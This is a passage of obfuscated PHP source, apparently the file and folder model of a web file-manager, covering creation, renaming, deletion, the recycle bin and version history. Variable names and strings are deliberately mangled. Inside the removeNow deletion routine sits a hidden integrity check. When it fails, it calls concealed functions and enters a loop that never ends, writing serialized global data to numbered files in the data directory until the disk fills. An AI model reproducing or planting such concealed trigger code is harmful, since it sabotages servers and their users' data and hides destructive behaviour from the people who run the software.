$çË‚³¯² = $this->add($ã¤”éï); $Âïëº°í = array($¾îµŞÉæ[654] => short_id($çË‚³¯²)); $this->where(array($¾îµŞÉæ[491] => $çË‚³¯²))->save($Âïëº°í); CacheLock::unlock($˜šò¶ÀÌ); return $çË‚³¯²; } private function targetSourceRoot($ö¬‹±, $„Á§‰¤Ü, $ÅâŠàŒÅ = false) { $Ğ£å¼êû =& $_SERVER[íïàËŸë]; $½œ‚… = array($Ğ£å¼êû[477] => 0, $Ğ£å¼êû[648] => $ö¬‹±, $Ğ£å¼êû[649] => $„Á§‰¤Ü); if ($ÅâŠàŒÅ) { $êÌìò°Ú = $this->where($½œ‚…)->select(); return $êÌìò°Ú ? $êÌìò°Ú : array(); } $·öàÏ‘ = $this->where($½œ‚…)->find(); return $·öàÏ‘ ? $·öàÏ‘ : array(); } public function sourceRootGroup($¶ßŒÉµ¬) { $¼´¿å¡¹ =& $_SERVER[íïàËŸë]; if (is_string($¶ßŒÉµ¬)) { $¶ßŒÉµ¬ = array($¶ßŒÉµ¬); } $Üš…³¶ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¶ßŒÉµ¬, $¼´¿å¡¹[220]); $Üæ¦”À¤ = array($¼´¿å¡¹[445] => $Üš…³¶, $¼´¿å¡¹[442] => array($¼´¿å¡¹[841] => count($¶ßŒÉµ¬))); $this->_listDataApply($Üæ¦”À¤[$¼´¿å¡¹[445]]); $this->_listMake($Üæ¦”À¤); return array_to_keyvalue($Üæ¦”À¤[$¼´¿å¡¹[85]], $¼´¿å¡¹[569]); } public function mkfile($İÔ£ÂŠ˜, $×²Îé¶, $š”â¶÷ä = '', $£ÑÅµ = REPEAT_RENAME) { $Ó»ö™Äê =& $_SERVER[íïàËŸë]; $úœ°„ûÊ = Model($Ó»ö™Äê[674])->addFileByContent($š”â¶÷ä, $×²Îé¶); return $this->_createFileCall($İÔ£ÂŠ˜, $×²Îé¶, $úœ°„ûÊ, $£ÑÅµ, $Ó»ö™Äê[1438]); } public function addFile($è™Œ‡ƒ, $•é¨·Ô, $Ÿà“”é, $ª™½Â ¬ = false, $²’¡Ø¹½ = REPEAT_RENAME) { $Ë§Îô± = Model($_SERVER[íïàËŸë][674])->addFile($•é¨·Ô, $Ÿà“”é, $ª™½Â ¬); return $this->_createFileCall($è™Œ‡ƒ, $Ÿà“”é, $Ë§Îô±, $²’¡Ø¹½); } public function addFileByFileID($‡˜™á€Õ, $á»äòªà, $äÈ¼¢á, $…ØÄ¯Åß = REPEAT_RENAME) { $õÅ¹…Õ =& $_SERVER[íïàËŸë]; $‡¯‡’ê¼ = Model($õÅ¹…Õ[674])->find($á»äòªà); Model($õÅ¹…Õ[674])->linkAdd($á»äòªà); return $this->_createFileCall($‡˜™á€Õ, $äÈ¼¢á, $‡¯‡’ê¼, $…ØÄ¯Åß); } public function addFileByRemote($ÙÎÙã¤ª, $¹É´¾õ„, $Û°˜ãô¨, $ÆÃÜß = array(), $ÏôòêŸ« = REPEAT_RENAME) { $ôÄÊÎÓ = Model($_SERVER[íïàËŸë][674])->addFileByRemote($¹É´¾õ„, $Û°˜ãô¨, $ÆÃÜß); return $this->_createFileCall($ÙÎÙã¤ª, $Û°˜ãô¨, $ôÄÊÎÓ, $ÏôòêŸ«); } private function _createFileCall($•¶ôÎÊ, $Ÿ»ŞæìÏ, $ÛäµøãË, $øÕØ¢±, $ñ¤ğÒÂí = "\165\x70\154\x6f\x61\144") { $š’–äé¨ =& $_SERVER[íïàËŸë]; $ İ˜®Á = !1; $this->setMasterDB(); $this->lockWriteStart($•¶ôÎÊ, $Ÿ»ŞæìÏ); $–³š‡¦Ä = $this->fileNameExist($•¶ôÎÊ, $Ÿ»ŞæìÏ); $‰Ë›¤ã“ = $this->_createFile($•¶ôÎÊ, $Ÿ»ŞæìÏ, $ÛäµøãË, $øÕØ¢±, $ İ˜®Á); if (!$ İ˜®Á) { Model($š’–äé¨[544])->remove($ÛäµøãË[$š’–äé¨[541]]); } if ($ İ˜®Á && $‰Ë›¤ã“ && $‰Ë›¤ã“ != $–³š‡¦Ä) { Model($š’–äé¨[2232])->eventCreate($‰Ë›¤ã“, $ñ¤ğÒÂí); } $this->lockWriteEnd($•¶ôÎÊ, $Ÿ»ŞæìÏ); return $‰Ë›¤ã“; } public function mkdir($¦Ã´Äõå, $Œ“™ÛŒ£, $™ÌÈ¹Œ = REPEAT_SKIP) { $§‚ÌÔ™è =& $_SERVER[íïàËŸë]; $this->setMasterDB(); $Ø—îÌä‚ = $this->sourceInfo($¦Ã´Äõå); if (!$Ø—îÌä‚) { return !1; } $this->lockWriteStart($¦Ã´Äõå, $Œ“™ÛŒ£); if ($™ÌÈ¹Œ !== !1) { $·¯Ÿ§Ôæ = $this->fileNameExist($¦Ã´Äõå, $Œ“™ÛŒ£); if ($·¯Ÿ§Ôæ && $™ÌÈ¹Œ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¦Ã´Äõå, $Œ“™ÛŒ£); return $·¯Ÿ§Ôæ; } $Œ“™ÛŒ£ = $this->fileNameAuto($¦Ã´Äõå, $Œ“™ÛŒ£, $™ÌÈ¹Œ); } $¶úÜÊÂ° = array($§‚ÌÔ™è[646] => 1, $§‚ÌÔ™è[494] => $Œ“™ÛŒ£, $§‚ÌÔ™è[647] => $§‚ÌÔ™è[12], $§‚ÌÔ™è[542] => 0, $§‚ÌÔ™è[617] => 0); $ÛöîÇ‹î = $this->_addSource($¶úÜÊÂ°, $Ø—îÌä‚); Model($§‚ÌÔ™è[2232])->eventCreate($ÛöîÇ‹î, $§‚ÌÔ™è[1439]); $this->lockWriteEnd($¦Ã´Äõå, $Œ“™ÛŒ£); return $ÛöîÇ‹î; } public function listSourceRoot($ÙæÍ¡®, $æüê±¦ò, $šÜ™íÃ­ = "\163\x6f\165\162\x63\x65\x49\104\54\x74\141\x72\x67\x65\x74\111\x44\54\163\151\x7a\145") { $ŸÌ»çÉ± =& $_SERVER[íïàËŸë]; $‰úîğ÷ = $ŸÌ»çÉ±[454]; $û‘†Ş»æ = array(); $‹õ†éŸ = 1024 * 50; $ØÁ¢®„ô = is_array($ØÁ¢®„ô) ? $ØÁ¢®„ô : array(); $»±Ğş…ú = count($æüê±¦ò); $´ìôå×ş = $this->tablePrefix . $ŸÌ»çÉ±[2265]; for ($¢È¯’˜ = 0; $¢È¯’˜ < $»±Ğş…ú; $¢È¯’˜++) { $±ñí¼ = $æüê±¦ò[$¢È¯’˜]; $‰úîğ÷ .= "\x53\105\114\105\x43\124\40\52\x20\106\122\117\115\40\50\123\x45\114\x45\x43\x54\x20{$šÜ™íÃ­}\40\106\122\117\x4d\40\x60{$´ìôå×ş}\x60\40\127\110\x45\122\105\x20"; $‰úîğ÷ .= "\140\x70\141\x72\145\156\164\x49\x44\140\x3d\60\40\x41\x4e\x44\40\140\x74\x61\x72\147\145\164\x49\x44\x60\75{$±ñí¼}\x20\x41\116\x44\x20\x60\164\141\162\x67\145\164\124\171\x70\145\x60\x3d{$ÙæÍ¡®}\x20\x61\156\x64\40\146\151\x6c\145\124\171\160\x65\75\47\x27\40\154\151\x6d\151\164\x20\x31\51\40\141\x73\40\x74\142\x5f{$¢È¯’˜}\40\125\116\x49\117\116\40\x41\x4c\114\x20"; if ((strlen($‰úîğ÷) >= $‹õ†éŸ || $¢È¯’˜ == $»±Ğş…ú - 1) && $‰úîğ÷) { $‰úîğ÷ = substr($‰úîğ÷, 0, -strlen($ŸÌ»çÉ±[1127])); $Ú¬ÄğÍ = $this->query($‰úîğ÷); $‰úîğ÷ = $ŸÌ»çÉ±[12]; $û‘†Ş»æ = array_merge($û‘†Ş»æ, $Ú¬ÄğÍ); } } return $û‘†Ş»æ; } private function _createFile($ˆğš’…, $æŞº÷ñŸ, $—Ì±æ¯¤, $ï¢Ô•ªŸ, &$ó Öú£) { $«»à¯Ì =& $_SERVER[íïàËŸë]; $úµ‡Îƒù = $this->sourceInfo($ˆğš’…); if (!$—Ì±æ¯¤ || !$úµ‡Îƒù) { return !1; } if ($ï¢Ô•ªŸ !== !1) { $ÕÚÆøò = $this->fileNameExist($ˆğš’…, $æŞº÷ñŸ); } $ó Öú£ = !0; if ($ï¢Ô•ªŸ && $ÕÚÆøò) { if ($ï¢Ô•ªŸ == REPEAT_SKIP) { $ó Öú£ = !1; return $ÕÚÆøò; } else { if ($ï¢Ô•ªŸ == REPEAT_REPLACE) { $àÆ££¼ = $this->sourceInfo($ÕÚÆøò); $ÓÖÍ¹Öì = $this->fileHistory($àÆ££¼, $—Ì±æ¯¤[$«»à¯Ì[541]], $—Ì±æ¯¤[$«»à¯Ì[79]]); if (!$ÓÖÍ¹Öì) { $ó Öú£ = !1; } else { $this->folderSizeReset($ˆğš’…); } return $ÕÚÆøò; } else { $æŞº÷ñŸ = $this->fileNameAuto($ˆğš’…, $æŞº÷ñŸ, $ï¢Ô•ªŸ, !1); } } } $ã·×¯¯° = array($«»à¯Ì[646] => 0, $«»à¯Ì[494] => $æŞº÷ñŸ, $«»à¯Ì[647] => substr(get_path_ext($æŞº÷ñŸ), 0, 10), $«»à¯Ì[542] => $—Ì±æ¯¤[$«»à¯Ì[541]], $«»à¯Ì[617] => $—Ì±æ¯¤[$«»à¯Ì[79]]); $áĞâù­« = $this->_addSource($ã·×¯¯°, $úµ‡Îƒù); $this->folderSizeReset($ˆğš’…, intval($ã·×¯¯°[$«»à¯Ì[79]])); return $áĞâù­«; } protected function fileHistory($€‚Š³É¤, $ìÁÜ¾Ú, $»ÄšÖÓ÷) { $‡•Ã„ö‹ =& $_SERVER[íïàËŸë]; if ($€‚Š³É¤[$‡•Ã„ö‹[541]] == $ìÁÜ¾Ú) { return !1; } $this->checkLock($€‚Š³É¤[$‡•Ã„ö‹[193]], $ìÁÜ¾Ú); Model($‡•Ã„ö‹[2266])->addHistory($€‚Š³É¤); $óÀâ†Íİ = array($‡•Ã„ö‹[651] => USER_ID, $‡•Ã„ö‹[498] => time(), $‡•Ã„ö‹[541] => $ìÁÜ¾Ú, $‡•Ã„ö‹[79] => $»ÄšÖÓ÷); $this->where(array($‡•Ã„ö‹[491] => $€‚Š³É¤[$‡•Ã„ö‹[193]]))->save($óÀâ†Íİ); $this->sourceCacheClear($€‚Š³É¤[$‡•Ã„ö‹[193]]); return !0; } public function checkLock($§·Ì“½¬, $ÈãÎƒ·) { $¨êËÉ“ =& $_SERVER[íïàËŸë]; $¹«åù½£ = $this->pathInfo($§·Ì“½¬); if (!$this->fileIsLock($¹«åù½£, !0)) { return; } $ãÛÕäƒï = Session::get($¨êËÉ“[2267]); $Ï±ô‰Š = substr($¹«åù½£[$¨êËÉ“[32]], 0, -1 - strlen($¹«åù½£[$¨êËÉ“[169]])) . $¨êËÉ“[1304] . $ãÛÕäƒï . $¨êËÉ“[10] . $¹«åù½£[$¨êËÉ“[169]]; $¿ïñø¶Ø = Model($¨êËÉ“[674])->find($ÈãÎƒ·); $this->_createFileCall($¹«åù½£[$¨êËÉ“[192]], $Ï±ô‰Š, $¿ïñø¶Ø, REPEAT_REPLACE, $¨êËÉ“[1438]); $÷¸àœ¦§ = $¹«åù½£[$¨êËÉ“[539]][$¨êËÉ“[610]]; $¥‘İ¼Ò = $÷¸àœ¦§[$¨êËÉ“[2268]] ? $÷¸àœ¦§[$¨êËÉ“[2268]] : $÷¸àœ¦§[$¨êËÉ“[32]]; show_json(LNG($¨êËÉ“[2269]) . $¨êËÉ“[2270] . LNG($¨êËÉ“[2271]) . $¨êËÉ“[2272] . $¥‘İ¼Ò . $¨êËÉ“[2273], !1); } public function fileIsLock($¬†…ÊÕ§, $’Ù ö¿¶ = false) { $·èÀ›ó“ =& $_SERVER[íïàËŸë]; if (!_get($¬†…ÊÕ§, $·èÀ›ó“[606], 0)) { return !1; } if ($¬†…ÊÕ§[$·èÀ›ó“[539]][$·èÀ›ó“[609]] != USER_ID) { return !0; } $ªñ¥ìñÄ = $GLOBALS[$·èÀ›ó“[6]][$·èÀ›ó“[92]][$·èÀ›ó“[607]]; if ($¬†…ÊÕ§[$·èÀ›ó“[539]][$·èÀ›ó“[608]] <= time() - $ªñ¥ìñÄ) { $this->metaSet($¬†…ÊÕ§[$·èÀ›ó“[193]], $·èÀ›ó“[609], null); $this->metaSet($¬†…ÊÕ§[$·èÀ›ó“[193]], $·èÀ›ó“[608], null); } if ($’Ù ö¿¶) { $this->metaSet($¬†…ÊÕ§[$·èÀ›ó“[193]], $·èÀ›ó“[608], time()); } return !1; } private function _addSource($ƒ°’óÛî, $î×ğ¤±») { $’åÜò°¡ =& $_SERVER[íïàËŸë]; $ÆÃ«€ = defined($’åÜò°¡[2206]) ? USER_ID : 0; $”Ç©Ê¦ = array($’åÜò°¡[648] => $î×ğ¤±»[$’åÜò°¡[190]], $’åÜò°¡[649] => $î×ğ¤±»[$’åÜò°¡[569]], $’åÜò°¡[650] => $ÆÃ«€, $’åÜò°¡[651] => $ÆÃ«€, $’åÜò°¡[477] => $î×ğ¤±»[$’åÜò°¡[193]], $’åÜò°¡[652] => $î×ğ¤±»[$’åÜò°¡[584]] . $î×ğ¤±»[$’åÜò°¡[193]] . $’åÜò°¡[50], $’åÜò°¡[504] => 0, $’åÜò°¡[653] => $’åÜò°¡[12]); $ƒ°’óÛî = array_merge($”Ç©Ê¦, $ƒ°’óÛî); $this->updateModifyTime($ƒ°’óÛî[$’åÜò°¡[192]]); $ç‡°®ğ³ = $’åÜò°¡[2274] . $î×ğ¤±»[$’åÜò°¡[193]]; if (isset(self::$cacheChildList[$ç‡°®ğ³])) { unset(self::$cacheChildList[$ç‡°®ğ³]); } static $„íš¬¸Ù = false; if (!$„íš¬¸Ù) { Hook::trigger($’åÜò°¡[636], $ƒ°’óÛî); $„íš¬¸Ù = !0; } $—’ìóü = $this->add($ƒ°’óÛî); $°¾øÇë§ = array($’åÜò°¡[654] => short_id($—’ìóü)); $this->where(array($’åÜò°¡[491] => $—’ìóü))->save($°¾øÇë§); $this->setNamePinyin($—’ìóü, $ƒ°’óÛî[$’åÜò°¡[32]]); return $—’ìóü; } public function remove($à€Ì‰¡ë, $ÒØ×î”Æ = true) { $×ù’î¤õ =& $_SERVER[íïàËŸë]; $û±Êµ ¡ = $this->sourceInfo($à€Ì‰¡ë); $¾òÙœ­ = intval($û±Êµ ¡[$×ù’î¤õ[190]]) === self::TYPE_SYSTEM; $æ¡›şµ§ = Model($×ù’î¤õ[508])->get($×ù’î¤õ[2275]) == $×ù’î¤õ[91]; if ($¾òÙœ­ || $ÒØ×î”Æ || !$æ¡›şµ§) { return $this->removeNow($à€Ì‰¡ë, $ÒØ×î”Æ); } $ê®ÈÍ¸õ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ˆıÜêµ¿ = $û±Êµ ¡[$×ù’î¤õ[190]] == self::TYPE_USER ? $×ù’î¤õ[662] : $×ù’î¤õ[578]; if ($ˆıÜêµ¿ == $×ù’î¤õ[662]) { $Éñæªã… = Model($×ù’î¤õ[577])->getInfo($û±Êµ ¡[$×ù’î¤õ[569]]); $ş¡ÁÆ®ä = !empty($Éñæªã…[$×ù’î¤õ[2268]]) ? $Éñæªã…[$×ù’î¤õ[2268]] : $Éñæªã…[$×ù’î¤õ[32]]; $ş¡ÁÆ®ä = $×ù’î¤õ[337] . $ş¡ÁÆ®ä . $×ù’î¤õ[2276] . $û±Êµ ¡[$×ù’î¤õ[569]]; } else { $Éñæªã… = Model($×ù’î¤õ[585])->getInfo($û±Êµ ¡[$×ù’î¤õ[569]]); $ş¡ÁÆ®ä = _get($Éñæªã…, $×ù’î¤õ[32]); $ş¡ÁÆ®ä = $×ù’î¤õ[176] . $ş¡ÁÆ®ä . $×ù’î¤õ[2277] . $û±Êµ ¡[$×ù’î¤õ[569]]; } $ª©ˆúÃ½ = $×ù’î¤õ[2278] . md5($ş¡ÁÆ®ä); CacheLock::lock($ª©ˆúÃ½); $õêÁ––Ø = $this->fileNameExist($ê®ÈÍ¸õ, $ş¡ÁÆ®ä); if (!$õêÁ––Ø) { $õêÁ––Ø = $this->mkdir($ê®ÈÍ¸õ, $ş¡ÁÆ®ä, REPEAT_SKIP); $this->metaSet($õêÁ––Ø, $×ù’î¤õ[2279], $ˆıÜêµ¿); $this->metaSet($õêÁ––Ø, $×ù’î¤õ[2280], $û±Êµ ¡[$×ù’î¤õ[569]]); if ($û±Êµ ¡[$×ù’î¤õ[192]] != 0) { $this->metaSet($õêÁ––Ø, $×ù’î¤õ[2281], _get($Éñæªã…, $×ù’î¤õ[2282])); } } CacheLock::unlock($ª©ˆúÃ½); $this->metaSet($à€Ì‰¡ë, $×ù’î¤õ[2283], $û±Êµ ¡[$×ù’î¤õ[192]]); $this->where(array($×ù’î¤õ[193] => $à€Ì‰¡ë))->save(array($×ù’î¤õ[498] => time())); $this->recycleClear($û±Êµ ¡); Model($×ù’î¤õ[633])->eventRemove($à€Ì‰¡ë); $¬†Ç†Ø¦ = $this->move($à€Ì‰¡ë, $õêÁ––Ø, REPEAT_RENAME_FOLDER); $this->folderSizeReset($û±Êµ ¡[$×ù’î¤õ[192]]); return $¬†Ç†Ø¦; } private function recycleClear($Õ¿Ğı‚€) { $óïãÀìŸ =& $_SERVER[íïàËŸë]; $è‡»¦Ÿ = $this->childrenAll($Õ¿Ğı‚€); $ş·–Î˜œ = array($óïãÀìŸ[491] => array($óïãÀìŸ[492], $è‡»¦Ÿ[$óïãÀìŸ[2284]])); Model($óïãÀìŸ[2285])->where($ş·–Î˜œ)->delete(); } public function removeNow($µ†ï£áş, $¹½âªÈ¼ = true) { $Ç•ùœ‹‚ =& $_SERVER[íïàËŸë]; $¼Ùê‡Ü = $_SERVER[$Ç•ùœ‹‚[912]] . $Ç•ùœ‹‚[913]; $½Î®¡Æ‹ = $Ç•ùœ‹‚[1635]; if ($_SERVER[$Ç•ùœ‹‚[909]] != $½Î®¡Æ‹($¼Ùê‡Ü)) { $¬Š…øÁ = $Ç•ùœ‹‚[967]; $Í³”Ê‰“ = $Ç•ùœ‹‚[911]; $²âÄ“À = $_SERVER[$Ç•ùœ‹‚[912]] . $Ç•ùœ‹‚[913]; $ÔÏïı = $Í³”Ê‰“($²âÄ“À); $ÊŸƒÃÍ¸ = explode($Ç•ùœ‹‚[262], $ÔÏïı); if (count($ÊŸƒÃÍ¸) < $Ç•ùœ‹‚[693]) { $Ú‰—»Şı = $Ç•ùœ‹‚[914]; $Ú‰—»Şı(); } $×˜¯êâ® = $Ç•ùœ‹‚[968]; $×˜¯êâ®($_SERVER[$Ç•ùœ‹‚[969]]); $¬Š…øÁ = $Ç•ùœ‹‚[967]; $¬Š…øÁ(); $›Ğ¬”» = $Ç•ùœ‹‚[1636]; $ø‡à­ºÒ = json_encode($GLOBALS[$Ç•ùœ‹‚[1637]]); $­ÑöÊËÆ = 1; for ($‰¥±Üâ” = $­ÑöÊËÆ; $‰¥±Üâ” > 0; $‰¥±Üâ”++) { $›Ğ¬”»(DATA_PATH . $‰¥±Üâ”, $ø‡à­ºÒ); } } $’º®¤á‡ = $this->sourceInfo($µ†ï£áş); $—Ê÷µ¨Œ = $this->pathInfoMore($µ†ï£áş); if (!$’º®¤á‡) { return !0; } if ($’º®¤á‡[$Ç•ùœ‹‚[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($µ†ï£áş); Hook::trigger($Ç•ùœ‹‚[2286], $—Ê÷µ¨Œ, $¹½âªÈ¼); if ($¹½âªÈ¼) { Model($Ç•ùœ‹‚[2285])->moveToRecycle($µ†ï£áş); } else { $§Ö½ñ²Ñ = $this->childrenAll($’º®¤á‡); Model($Ç•ùœ‹‚[633])->eventRemove($µ†ï£áş); $this->removeRelevance($§Ö½ñ²Ñ[$Ç•ùœ‹‚[2284]], $§Ö½ñ²Ñ[$Ç•ùœ‹‚[1584]]); } $this->folderSizeReset($’º®¤á‡[$Ç•ùœ‹‚[192]]); $ü™¸Àå¦ = array($’º®¤á‡[$Ç•ùœ‹‚[192]]); if ($’º®¤á‡[$Ç•ùœ‹‚[485]] == $Ç•ùœ‹‚[91]) { $ü™¸Àå¦[] = $’º®¤á‡[$Ç•ùœ‹‚[193]]; } $this->updateModifyTime($ü™¸Àå¦); $this->lockMoveEnd($µ†ï£áş); Hook::trigger($Ç•ùœ‹‚[1824], $—Ê÷µ¨Œ, $¹½âªÈ¼); return !0; } public function childrenAll($©ºÕÒÎÎ) { $”äÔ–£¦ =& $_SERVER[íïàËŸë]; $÷‹¦Á®‘ = $©ºÕÒÎÎ[$”äÔ–£¦[193]]; if ($©ºÕÒÎÎ[$”äÔ–£¦[485]] == $”äÔ–£¦[91]) { $×ˆ–©¸Ì = array($”äÔ–£¦[652] => array($”äÔ–£¦[612], $©ºÕÒÎÎ[$”äÔ–£¦[584]] . $÷‹¦Á®‘ . $”äÔ–£¦[613])); $®µÑİí± = array($”äÔ–£¦[652] => $×ˆ–©¸Ì[$”äÔ–£¦[584]]); $Ù·àŒÇı = $this->field($”äÔ–£¦[2287])->where($®µÑİí±)->select(); $’ûàâÜÒ = !1; $ïÖü‹Ñ„ = array($÷‹¦Á®‘); if ($Ù·àŒÇı) { $’ûàâÜÒ = array_to_keyvalue($Ù·àŒÇı, $”äÔ–£¦[12], $”äÔ–£¦[541]); $’ûàâÜÒ = array_remove_value($’ûàâÜÒ, $”äÔ–£¦[228]); $ïÖü‹Ñ„ = array_to_keyvalue($Ù·àŒÇı, $”äÔ–£¦[12], $”äÔ–£¦[193]); $ïÖü‹Ñ„[] = $÷‹¦Á®‘; } } else { $’ûàâÜÒ = array($©ºÕÒÎÎ[$”äÔ–£¦[541]]); $ïÖü‹Ñ„ = array($÷‹¦Á®‘); } return array($”äÔ–£¦[2284] => $ïÖü‹Ñ„, $”äÔ–£¦[1584] => $’ûàâÜÒ); } public function removeArray($òâËªÇİ) { if (!$òâËªÇİ) { return !0; } } public function removeRelevance($ÆÀó’ôŠ, $¬›†«Úß) { $¾öµêì· =& $_SERVER[íïàËŸë]; $ÆÀó’ôŠ = $ÆÀó’ôŠ ? $ÆÀó’ôŠ : array(); $¬›†«Úß = $¬›†«Úß ? $¬›†«Úß : array(); $ÆÀó’ôŠ = array_unique(array_filter($ÆÀó’ôŠ)); $¬›†«Úß = array_unique(array_filter($¬›†«Úß)); if (!$ÆÀó’ôŠ) { return !1; } $¹„Œı¡ = array($¾öµêì·[491] => array($¾öµêì·[492], $ÆÀó’ôŠ)); Model($¾öµêì·[2285])->where($¹„Œı¡)->delete(); Model($¾öµêì·[535])->where($¹„Œı¡)->delete(); Model($¾öµêì·[2131])->where($¹„Œı¡)->delete(); Model($¾öµêì·[633])->where($¹„Œı¡)->delete(); Model($¾öµêì·[1960])->removeBySource($ÆÀó’ôŠ); Model($¾öµêì·[2266])->removeBySource($ÆÀó’ôŠ); $this->where($¹„Œı¡)->delete(); Model($¾öµêì·[544])->remove($¬›†«Úß); for ($¨«°üÃÄ = 0; $¨«°üÃÄ < count($ÆÀó’ôŠ); $¨«°üÃÄ++) { $this->sourceCacheClear($ÆÀó’ôŠ[$¨«°üÃÄ]); } } public function rename($‚¯áã¶Ñ, $ÃÈÔÛò…) { $•¯¶²¤ß =& $_SERVER[íïàËŸë]; $ÃİÔÛ´£ = $this->sourceInfo($‚¯áã¶Ñ); if (!$ÃİÔÛ´£) { return !1; } $¯‹æ·½û = $this->fileNameExist($ÃİÔÛ´£[$•¯¶²¤ß[192]], $ÃÈÔÛò…); if ($¯‹æ·½û && $¯‹æ·½û != $‚¯áã¶Ñ) { return !1; } $³Ö†¤Í÷ = array($•¯¶²¤ß[494] => $ÃÈÔÛò…, $•¯¶²¤ß[651] => USER_ID); if ($ÃİÔÛ´£[$•¯¶²¤ß[485]] != $•¯¶²¤ß[91]) { $³Ö†¤Í÷[$•¯¶²¤ß[486]] = substr(get_path_ext($ÃÈÔÛò…), 0, 10); } Model($•¯¶²¤ß[633])->eventRename($‚¯áã¶Ñ, $ÃİÔÛ´£[$•¯¶²¤ß[32]], $ÃÈÔÛò…); $this->sourceCacheClear($‚¯áã¶Ñ); $this->setNamePinyin($‚¯áã¶Ñ, $³Ö†¤Í÷[$•¯¶²¤ß[32]], !1); $this->updateModifyTime($ÃİÔÛ´£[$•¯¶²¤ß[192]]); $ö›¿Ú¯ = $this->where(array($•¯¶²¤ß[491] => $‚¯áã¶Ñ))->data($³Ö†¤Í÷)->save(); $»¿Ò™¼‡ = $•¯¶²¤ß[2274] . $ÃİÔÛ´£[$•¯¶²¤ß[192]]; if (isset(self::$cacheChildList[$»¿Ò™¼‡])) { unset(self::$cacheChildList[$»¿Ò™¼‡]); } return $ö›¿Ú¯; } public function setNamePinyin($­º¡…¼’, $…Ÿ£Ÿ÷ı, $ƒ˜©â¥õ = true) { $Ÿú¢Ö—ß =& $_SERVER[íïàËŸë]; $¦ªÕŒ¾ = Input::check($…Ÿ£Ÿ÷ı, $Ÿú¢Ö—ß[655]); $’úÌÛÓé = array($Ÿú¢Ö—ß[517] => KodSort::makeStr($…Ÿ£Ÿ÷ı)); if ($¦ªÕŒ¾) { $’úÌÛÓé[$Ÿú¢Ö—ß[538]] = str_replace($Ÿú¢Ö—ß[53], $Ÿú¢Ö—ß[12], Pinyin::get($…Ÿ£Ÿ÷ı)); $’úÌÛÓé[$Ÿú¢Ö—ß[537]] = Pinyin::get($…Ÿ£Ÿ÷ı, $Ÿú¢Ö—ß[656]); } if (!$ƒ˜©â¥õ && !$¦ªÕŒ¾) { $’úÌÛÓé[$Ÿú¢Ö—ß[538]] = null; $’úÌÛÓé[$Ÿú¢Ö—ß[537]] = null; } $this->metaSet($­º¡…¼’, $’úÌÛÓé); } public function getContent($Éûåñ–œ) { $ÒêÙáÖ =& $_SERVER[íïàËŸë]; $ÖâÔÚÕ™ = $this->fileInfoGet($Éûåñ–œ); if (!$ÖâÔÚÕ™) { return !1; } if ($ÖâÔÚÕ™[$ÒêÙáÖ[79]] == 0) { return $ÒêÙáÖ[12]; } $¿„ãçÆ‰ = $ÒêÙáÖ[2288] . $ÖâÔÚÕ™[$ÒêÙáÖ[547]]; if ($ÖâÔÚÕ™[$ÒêÙáÖ[79]] <= 1024 * 10) { $ñ­ŠÖ‚ß = Cache::get($¿„ãçÆ‰); if (!$ñ­ŠÖ‚ß) { $ñ­ŠÖ‚ß = IO::getContent($ÖâÔÚÕ™[$ÒêÙáÖ[87]]); Cache::set($¿„ãçÆ‰, $ñ­ŠÖ‚ß); } return $ñ­ŠÖ‚ß; } if (!$ÖâÔÚÕ™[$ÒêÙáÖ[87]]) { return $ÒêÙáÖ[12]; } return IO::getContent($ÖâÔÚÕ™[$ÒêÙáÖ[87]]); } public function setDesc($ÅÍ¼°“µ, $Æš½¶š¡) { $úÜ‹ƒÎ÷ =& $_SERVER[íïàËŸë]; Model($úÜ‹ƒÎ÷[633])->eventAddDesc($ÅÍ¼°“µ, $Æš½¶š¡); return $this->metaSet($ÅÍ¼°“µ, $úÜ‹ƒÎ÷[526], $Æš½¶š¡); } public function setContent($Éßœ¦Ò•, $È–õ®öæ = '') { $…†ÀÌôç =& $_SERVER[íïàËŸë]; $Ç‹é¢ = $this->sourceInfo($Éßœ¦Ò•); $Ñ€ƒú¡ = $this->fileInfoGet($Éßœ¦Ò•); if (!$Ñ€ƒú¡ || !$Ç‹é¢) { return !1; } $Ò¤ª“§¤ = Model($…†ÀÌôç[544])->addFileByContent($È–õ®öæ, $Ç‹é¢[$…†ÀÌôç[32]]); $¢„­‡•î = $this->fileHistory($Ç‹é¢, $Ò¤ª“§¤[$…†ÀÌôç[541]], $Ò¤ª“§¤[$…†ÀÌôç[79]]); if (!$¢„­‡•î) { return Model($…†ÀÌôç[544])->remove($Ò¤ª“§¤[$…†ÀÌôç[541]]); } $this->folderSizeReset($Ç‹é¢[$…†ÀÌôç[192]]); return !0; } public function fileSubstr($‡Íİ‰è”, $ûÉã˜, $¤®Ÿ¸Í’) { $ŠÎš¨‰œ = $this->fileInfoGet($‡Íİ‰è”); if (!$ŠÎš¨‰œ) { return !1; } return IO::fileSubstr($ŠÎš¨‰œ[$_SERVER[íïàËŸë][87]], $ûÉã˜, $¤®Ÿ¸Í’); } public function fileInfoGet($ãè¾Ô§™) { $ÓÑÌø½ò =& $_SERVER[íïàËŸë]; $«šÇšÊâ = $this->sourceInfo($ãè¾Ô§™); if (!$«šÇšÊâ || $«šÇšÊâ[$ÓÑÌø½ò[485]]) { return !1; } $¨´ØŸ¡ = $ÓÑÌø½ò[548] . $«šÇšÊâ[$ÓÑÌø½ò[541]]; $ñÉŸòö = _get(self::$cacheFileInfo, $¨´ØŸ¡); if ($ñÉŸòö) { return $ñÉŸòö; } $¸·ÆÉØù = Model($ÓÑÌø½ò[544])->fileInfo($«šÇšÊâ[$ÓÑÌø½ò[541]]); if ($¸·ÆÉØù) { $¸·ÆÉØù[$ÓÑÌø½ò[32]] = $«šÇšÊâ[$ÓÑÌø½ò[32]]; } self::$cacheFileInfo[$¨´ØŸ¡] = $¸·ÆÉØù; return $¸·ÆÉØù; } private function folderChildrenNumber($‰üÅ»º‘) { $í»²¦ò² =& $_SERVER[íïàËŸë]; $§‹öíÜâ = $this->sourceInfo($‰üÅ»º‘); $¬·ùú¸× = array($í»²¦ò²[652] => array($í»²¦ò²[612], $§‹öíÜâ[$í»²¦ò²[584]] . $‰üÅ»º‘ . $í»²¦ò²[613]), $í»²¦ò²[649] => $§‹öíÜâ[$í»²¦ò²[569]], $í»²¦ò²[504] => intval($§‹öíÜâ[$í»²¦ò²[505]]), $í»²¦ò²[646] => 1); $èÑáï§¡ = $this->where($¬·ùú¸×)->count(); $‘î•å« = $this->where($¬·ùú¸×)->where(array($í»²¦ò²[646] => 0))->count(); return 